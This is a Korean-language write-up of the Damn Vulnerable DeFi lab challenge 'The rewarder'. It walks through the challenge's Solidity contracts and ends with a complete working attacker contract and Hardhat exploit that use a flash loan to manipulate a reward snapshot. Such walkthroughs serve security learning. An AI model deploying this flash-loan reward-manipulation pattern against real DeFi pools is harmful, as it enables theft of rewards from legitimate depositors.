# 문제 소개

![문제.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fe49dc10-12ca-49ff-86f8-dd7b1bb66a6e/%EB%AC%B8%EC%A0%9C.png)

문제 #5 - The rewarder

DVT 토큰을 입금해 놓고 5일마다 보상을 받는 풀이 있습니다. Alic,Bob,Charlie,David는 이미 이 풀에 DVT 토큰을 입금해 놓고 리워드를 받았습니다. 공격자인 당신은 DVT 토큰이 없지만 플래시 론을 이용하여 DVT 토큰을 대출 받아 곧 다가올 라운드(스냅샷)에 가장 많은 리워드를 받는 것이 목적입니다.

# 코드 분석 및 공격 설계

이번 코드는 조금 양이 많다. 

1. AccountingToken.sol
2. RewardToken.sol
3. RewardToken.sol
4. TheRewarderPool.sol

네 코드를 하나씩 천천히 살펴보자.

## AccountingToken.sol

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

contract AccountingToken is ERC20Snapshot, AccessControl {

    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    bytes32 public constant SNAPSHOT_ROLE = keccak256("SNAPSHOT_ROLE");
    bytes32 public constant BURNER_ROLE = keccak256("BURNER_ROLE");

    constructor() ERC20("rToken", "rTKN") {
        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _setupRole(MINTER_ROLE, msg.sender);
        _setupRole(SNAPSHOT_ROLE, msg.sender);
        _setupRole(BURNER_ROLE, msg.sender);
    }

    function mint(address to, uint256 amount) external {
        require(hasRole(MINTER_ROLE, msg.sender), "Forbidden");
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) external {
        require(hasRole(BURNER_ROLE, msg.sender), "Forbidden");
        _burn(from, amount);
    }

    function snapshot() external returns (uint256) {
        require(hasRole(SNAPSHOT_ROLE, msg.sender), "Forbidden");
        return _snapshot();
    }

    // Do not need transfer of this token
    function _transfer(address, address, uint256) internal pure override {
        revert("Not implemented");
    }

    // Do not need allowance of this token
    function _approve(address, address, uint256) internal pure override {
        revert("Not implemented");
    }
}
```

constructor는 msg.sender에게 rToken,RTKN에 대해 관리자 권한, 민팅권한, 스냅샷권한, 소각 권한을 준다. 

mint는 msg.sender가 발행 권한이 있으면 특정 주소(to)에게 토큰 amount 만큼 발행해준다.

burn은 msg.sender가 소각 권한이 있으면 특정 주소(from)에서 amount만큼 소각한다.

snapshot은 msg.sneder가 스냅샷 권한이 있으면 특정 시점을 스냅샷 찍는다.

transfer와 approve 함수는 revert로 막아서 이 토큰은 전송과 approve가 불가능하게 하였다.

## RewardToken.sol

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

contract RewardToken is ERC20, AccessControl {

    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    constructor() ERC20("Reward Token", "RWT") {
        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _setupRole(MINTER_ROLE, msg.sender);
    }

    function mint(address to, uint256 amount) external {
        require(hasRole(MINTER_ROLE, msg.sender));
        _mint(to, amount);
    }
}
```

constructor는 msg.sender에게 Reward Token,RWT에 대해 관리자 권한과 발행 권한을 제공한다.

mint는 msg.sender가 발행 권한이 있으면 특정 주소(to)에게 amount 만큼 발행해준다.

## FlashLoanerPool.sol

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 * @dev A simple pool to get flash loans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {

    using Address for address;

    DamnValuableToken public immutable liquidityToken;

    constructor(address liquidityTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
        require(amount <= balanceBefore, "Not enough token balance");

        require(msg.sender.isContract(), "Borrower must be a deployed contract");
        
        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveFlashLoan(uint256)",
                amount
            )
        );

        require(liquidityToken.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
    }
}
```

constructor는 DamnValuableToken 주소를 받아 liquidityToken에 담는다.

flashLoan 함수에서는 다음과 같이 진행된다.

1. 이 컨트랙트에서 DamnValuableToken의 잔고를 저장한다.
2. flashLoan을 호출한 msg.sender는 컨트랙트여야한다.
3. DamnValuableToken을 msg.sender에게 amount만큼 보내준다.
4. msg.sender의 receiveFlahsLoan(amount)함수를 실행시킨다.
5. 만약 현재 이 컨트랙트의 DamnValuableToken 잔고가 대출해주기 전보다 잔고가 줄었다면 revert시킨다.

이를 통해서 알 수 있는점은 이 컨트랙트를 대상으로 공격하기 위해서는 

1. 컨트랙트를 작성해야 하고
2. 그 컨트랙트에서 receiveFlashLoan 함수가 존재해야 하며
3. receiveFlashLoan 함수 호출 후에는 대출을 갚아서 FlashLoanerPool 컨트랙트의 DamnValuableToken 잔고가 줄어들지 않도록 해야 한다.

## TheRewarderPool.sol

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./AccountingToken.sol";

contract TheRewarderPool {

    // Minimum duration of each round of rewards in seconds
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

    uint256 public lastSnapshotIdForRewards;
    uint256 public lastRecordedSnapshotTimestamp;

    mapping(address => uint256) public lastRewardTimestamps;

    // Token deposited into the pool by users
    DamnValuableToken public immutable liquidityToken;

    // Token used for internal accounting and snapshots
    // Pegged 1:1 with the liquidity token
    AccountingToken public accToken;
    
    // Token in which rewards are issued
    RewardToken public immutable rewardToken;

    // Track number of rounds
    uint256 public roundNumber;

    constructor(address tokenAddress) {
        // Assuming all three tokens have 18 decimals
        liquidityToken = DamnValuableToken(tokenAddress);
        accToken = new AccountingToken();
        rewardToken = new RewardToken();

        _recordSnapshot();
    }

    /**
     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
     */
    function deposit(uint256 amountToDeposit) external {
        require(amountToDeposit > 0, "Must deposit tokens");
        
        accToken.mint(msg.sender, amountToDeposit);
        distributeRewards();

        require(
            liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)
        );
    }

    function withdraw(uint256 amountToWithdraw) external {
        accToken.burn(msg.sender, amountToWithdraw);
        require(liquidityToken.transfer(msg.sender, amountToWithdraw));
    }

    function distributeRewards() public returns (uint256) {
        uint256 rewards = 0;

        if(isNewRewardsRound()) {
            _recordSnapshot();
        }        
        
        uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);
        uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);

        if (amountDeposited > 0 && totalDeposits > 0) {
            rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;

            if(rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = block.timestamp;
            }
        }

        return rewards;     
    }

    function _recordSnapshot() private {
        lastSnapshotIdForRewards = accToken.snapshot();
        lastRecordedSnapshotTimestamp = block.timestamp;
        roundNumber++;
    }

    function _hasRetrievedReward(address account) private view returns (bool) {
        return (
            lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp &&
            lastRewardTimestamps[account] <= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION
        );
    }

    function isNewRewardsRound() public view returns (bool) {
        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
    }
}
```

문제의 핵심이 되는 TheRewarderPool이다.

REWARDS_ROUND_MIN_DURATION 즉 리워드가 지급되는 보상은 5일로 고정이 되어있고

토큰은 세종류가 있는데

1. liquidityToken(DamnValuableToken)
2. accToken (토큰 카운팅)
3. rewardToken (스냅샷 기반 보상 토큰)

이 있다.

함수로는

1. constructor
2. deposit
3. withdraw
4. distributeRewards
5. recordSnapshot
6. hasRetrievedReward
7. isNewRewardsRound 

함수가 있다.

constructor는 각 토큰을 받을 수 있도록 할당해주는 것이므로 constructor를 제외한 함수들을 살펴보자

```solidity
 /**
     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
     */
    function deposit(uint256 amountToDeposit) external {
        require(amountToDeposit > 0, "Must deposit tokens");
        
        accToken.mint(msg.sender, amountToDeposit);
        distributeRewards();

        require(
            liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)
        );
    }
```

deposit 함수인데 주의사항이 적혀있다. 사전에 liquidity tokens를 deposit 하기 전에 approved를 해야 한다고 되어있다.

함수 내용은 다음과 같다.

1. amountToDeposit 즉 입금할 양이 0보다 커야한다.
2. accToken(토큰을 카운팅)을 발행한다.
3. Rewards를 분배한다.
4. liquidityToken(유동성 토큰)을 Deposit 호출자로부터 이 컨트랙트 주소로 입금한 양만큼 옮긴다.

```solidity
    function withdraw(uint256 amountToWithdraw) external {
        accToken.burn(msg.sender, amountToWithdraw);
        require(liquidityToken.transfer(msg.sender, amountToWithdraw));
    }
```

withdraw 함수이다.

accToken(카운팅 한 토큰)을 출금하려는 양만큼 소각하고 liquidityToken(유동성 토큰)에서 msg.sender에게 출금하는 양만큼 전송해준다.  

```solidity
    function distributeRewards() public returns (uint256) {
        uint256 rewards = 0;

        if(isNewRewardsRound()) {
            _recordSnapshot();
        }        
        
        uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);
        uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);

        if (amountDeposited > 0 && totalDeposits > 0) {
            rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;

            if(rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = block.timestamp;
            }
        }

        return rewards;     
    }
```

distributeReward 함수이다.

isNewRewardsRound를 통해 리워드 라운드가 바뀌었는지 검사하고 라운드가 바뀌었으면 스냅샷을 찍는다.

totalDeposits는 마지막으로 스냅샷을 찍었을 때의 accToken(카운팅된 토큰)총 공급량이고

amountDeposited는 마지막으로 스냅샷을 찍었을 때의 msg.sender의 accToken(카운팅된 토큰)양이다.

이 두 양이 0보다 크다면 리워드는 (msg.sender의 공급양 * *100 ** 10**18) / 총 공급량 으로 설정된다.

이 리워드 값이 0보다 크고 msg.sender가 hasRetrivedReward하지 않았다면 msg.sender에게 리워드 토큰을 rewards만큼 발행해주고 msg.sender가 마지막으로 보상 받은 시점을 lastRewardTimeStamps에 매핑하여 저장한다.

나머지 함수들은 한번에 보겠다.

```solidity
    function _recordSnapshot() private {
        lastSnapshotIdForRewards = accToken.snapshot();
        lastRecordedSnapshotTimestamp = block.timestamp;
        roundNumber++;
    }

    function _hasRetrievedReward(address account) private view returns (bool) {
        return (
            lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp &&
            lastRewardTimestamps[account] <= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION
        );
    }

    function isNewRewardsRound() public view returns (bool) {
        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
    }
```

recordSnapshot은 accToken을 스냅샷을 찍고 이 스냅샷찍은 시간을 저장한 후 라운드를 증가시킨다.

hasRetrievedReward는 전달받은 account에 매핑된 마지막으로 보상 받은 시간이 마지막으로 스냅샷찍은 이후이고 마지막으로 보상 받은 시점이 마지막으로 스냅샷 찍은 시점 + 5일 이내인지 확인한다.

즉 이번 라운드에서 보상을 받았는지를 확인하는 것이다. 만약 보상을 받았다면 true가 반환되어 distributeRewards함수에서 리워드 토큰을 받는 조건을 충족하지 않아 보상을 받지 못하게 된다.

isNewRewardsRound 함수는 현재 블록의 타임스탬프가 기존 마지막으로 스냅샷 찍은 시점에서 라운드 주기인 5일을 지났는지 반환해준다. 

즉 이 컨트랙트에서 입금하고 리워드 토큰을 받는 과정은 다음과 같이 이루어진다.

1. msg.sender가 DamnValuableToken을 이 컨트랙트에 입금한다.
2. 새로운 스냅샷이 찍히는 시점이라면 (기존 스냅샷 시기+5일) 스냅샷을 찍는다. (선택)
3. 기존 스냅샷 때의 총공급량 대비 msg.sender가 입금한 양을 계산하여 리워드를 산정한다.
4. msg.sender가 현재 라운드에 리워드를 받지 않았다면 리워드 토큰을 제공해준다.

다른 사용자가 공급해놓은 총 공급량대비 내가 공급한(입금한)양이 압도적으로 많다면 리워드 토큰을 압도적으로 많이 분배 받을 수 있다.

이를 이용해서 공격은 다음과 같이 설계하면 된다.

1. 대출 풀에서 많은양의 DamnValuableToken을 대출받는다.
2. 이를 스냅샷이 찍히는 타이밍에 맞추어 TheRewarderPool에 deposit하여 스냅샷을 찍히고 리워드 토큰을 받는다.
3. TheRewarderPool에 deposit했던 양을 전부 withdraw로 출금한 후 대출 풀에서 빌린 DamnValuableToken을 갚는다.
4. 내 돈을 들이지 않고 많은 양의 리워드 토큰을 얻게 된다.

# 공격

컨트랙트를 공격 설계한대로 작성하자.

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./AccountingToken.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface ITheRewarderPool{
    function deposit(uint256 amountToDeposit) external ;
    function withdraw(uint256 amountToWithdraw) external;
}
interface IFlashLoanPool{
     function flashLoan(uint256 amount) external ;
}

contract attack{
    address RewardPool;
    address attacker;
    IFlashLoanPool FlashLoanPool;
    DamnValuableToken public immutable liquidityToken;
    AccountingToken public accToken;
    RewardToken public immutable rewardToken;
    
    constructor(address _RewarderPool,address _LoanPool, address _DVT ,address _acT,address _reT,address _attacker){
        RewardPool = _RewarderPool;
        FlashLoanPool = IFlashLoanPool(_LoanPool);
        liquidityToken = DamnValuableToken(_DVT);
        accToken = AccountingToken(_acT);
        rewardToken = RewardToken(_reT);
        attacker=_attacker;
    }
    function solve(uint256 amount)public { // 대출받기
        FlashLoanPool.flashLoan(amount);
    }
    function receiveFlashLoan(uint256 amount) public {// 대출받고나면 실행될 함수
        ITheRewarderPool target=ITheRewarderPool(RewardPool);
        liquidityToken.approve(RewardPool,liquidityToken.balanceOf(address(this)));
        target.deposit(liquidityToken.balanceOf(address(this)));
        target.withdraw(accToken.balanceOf(address(this)));
        rewardToken.transfer(attacker,rewardToken.balanceOf(address(this)));
        liquidityToken.transfer(msg.sender,amount);
    }

}
```

DamnValuableToken을 사용하므로 DamnValuableToken을 import하고 선언해주었으며

AccountingToken을 이용하여 출금해주므로 AccountingToken 또한 import하고 선언해주었고

RewardToken을 내 공격자 주소(attacker.address)로 보내는 것이 목적이기 때문에 RewardToken도 선언해주었따.

생성자를 통해 RewardPool의 주소, 대출 풀의 주소, 각 토큰의 주소 및 공격자의 주소를 받아서 저장해준다.

공격은 solve를 통해 대출 풀에 있는 양만큼 대출을 받으면 대출 풀에서 내 컨트랙트의 receiveFlashLoan함수를 실행시킨다.

1. 생성자로 저장해 두었던 RewarderPool의 주소를 인터페이스로 감싸 target으로 넣는다.
2. deposit함수를 호출하기 전에 approve를 먼저 해야한다고 써져있었기에 RewardPool주소에게 내 컨트랙트가 가진 토큰 만큼 승인해준다.
3. RewarderPool의 deposit으로 내 컨트랙트가 가진 토큰 만큼 입금한 후
4. 입금하면서 받은 accToken 만큼 다시 출금해준다.
5. 그러면 타이밍을 맞춰서 스냅샷을 통해 받았다면 rewardToken이 컨트랙트에 들어왔을 것이기에 이를 attacker의 주소로 보낸다. 

이제 test 폴더의 The-rewarder.challange.js 에서 테스트를 통해 공격을 실행하자.

```tsx
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] The rewarder', function () {

    let deployer, alice, bob, charlie, david, attacker;
    let users;

    const TOKENS_IN_LENDER_POOL = ethers.utils.parseEther('1000000'); // 1 million tokens

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice, bob, charlie, david];

        const FlashLoanerPoolFactory = await ethers.getContractFactory('FlashLoanerPool', deployer);
        const TheRewarderPoolFactory = await ethers.getContractFactory('TheRewarderPool', deployer);
        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const RewardTokenFactory = await ethers.getContractFactory('RewardToken', deployer);
        const AccountingTokenFactory = await ethers.getContractFactory('AccountingToken', deployer);

        this.liquidityToken = await DamnValuableTokenFactory.deploy();
        this.flashLoanPool = await FlashLoanerPoolFactory.deploy(this.liquidityToken.address);

        // Set initial token balance of the pool offering flash loans
        await this.liquidityToken.transfer(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL);

        this.rewarderPool = await TheRewarderPoolFactory.deploy(this.liquidityToken.address);
        this.rewardToken = await RewardTokenFactory.attach(await this.rewarderPool.rewardToken());
        this.accountingToken = await AccountingTokenFactory.attach(await this.rewarderPool.accToken());

        // Alice, Bob, Charlie and David deposit 100 tokens each
        for (let i = 0; i < users.length; i++) {
            const amount = ethers.utils.parseEther('100');
            await this.liquidityToken.transfer(users[i].address, amount);
            await this.liquidityToken.connect(users[i]).approve(this.rewarderPool.address, amount);
            await this.rewarderPool.connect(users[i]).deposit(amount);
            expect(
                await this.accountingToken.balanceOf(users[i].address)
            ).to.be.eq(amount);
        }
        expect(await this.accountingToken.totalSupply()).to.be.eq(ethers.utils.parseEther('400'));
        expect(await this.rewardToken.totalSupply()).to.be.eq('0');

        // Advance time 5 days so that depositors can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        
        // Each depositor gets 25 reward tokens
        for (let i = 0; i < users.length; i++) {
            await this.rewarderPool.connect(users[i]).distributeRewards();
            expect(
                await this.rewardToken.balanceOf(users[i].address)
            ).to.be.eq(ethers.utils.parseEther('25'));
        }
        expect(await this.rewardToken.totalSupply()).to.be.eq(ethers.utils.parseEther('100'));

        // Attacker starts with zero DVT tokens in balance
        expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
        
        // Two rounds should have occurred so far
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq('2');
    });

    it('Exploit', async function () {
				/** CODE YOUR EXPLOIT HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Only one round should have taken place
        expect(
            await this.rewarderPool.roundNumber()
        ).to.be.eq('3');

        // Users should get neglegible rewards this round
        for (let i = 0; i < users.length; i++) {
            await this.rewarderPool.connect(users[i]).distributeRewards();
            let rewards = await this.rewardToken.balanceOf(users[i].address);
            
            // The difference between current and previous rewards balance should be lower than 0.01 tokens
            let delta = rewards.sub(ethers.utils.parseEther('25'));
            expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
        }
        
        // Rewards must have been issued to the attacker account
        expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
        let rewards = await this.rewardToken.balanceOf(attacker.address);

        // The amount of rewards earned should be really close to 100 tokens
        let delta = ethers.utils.parseEther('100').sub(rewards);
        expect(delta).to.be.lt(ethers.utils.parseUnits('1', 17));

        // Attacker finishes with zero DVT tokens in balance
        expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
    });
});
```

여기서 대출 풀에 들어있는 금액은 TOKENS_IN_LENDER_POOL로 선언되어 있으므로 이를 이용하자.

```tsx
it('Exploit', async function () {
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        const attackFactory = await ethers.getContractFactory('attack', attacker);
        this.attack = await attackFactory.deploy(this.rewarderPool.address,
            this.flashLoanPool.address
            , this.liquidityToken.address 
            ,this.accountingToken.address,
            this.rewardToken.address,
            attacker.address);
        this.attack.connect(attacker).solve(TOKENS_IN_LENDER_POOL);
    });
```

hardhat에서는 일정 시간 이후 테스트를 제공하기 위해 ethers.provider.send(”evm_increaseTime”,[시간(초단위)]) 를 통해 일정시간을 진행시킬 수 있다.

이를 이용하여 1라운드 시간인 5일을 진행시키고 attack 컨트랙트를 deploy한 후 solve함수로 대출 풀에서 최대치를 대출받도록 했다.

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/df79a2a3-8e3d-4816-83d3-5df635c5eec3/%EC%84%B1%EA%B3%B5.png)

그리고 npm run the-rewarder를 통해 테스트를 실행해보면 Exploit이 정상적으로 잘 진행된 것을 확인할 수 있다.
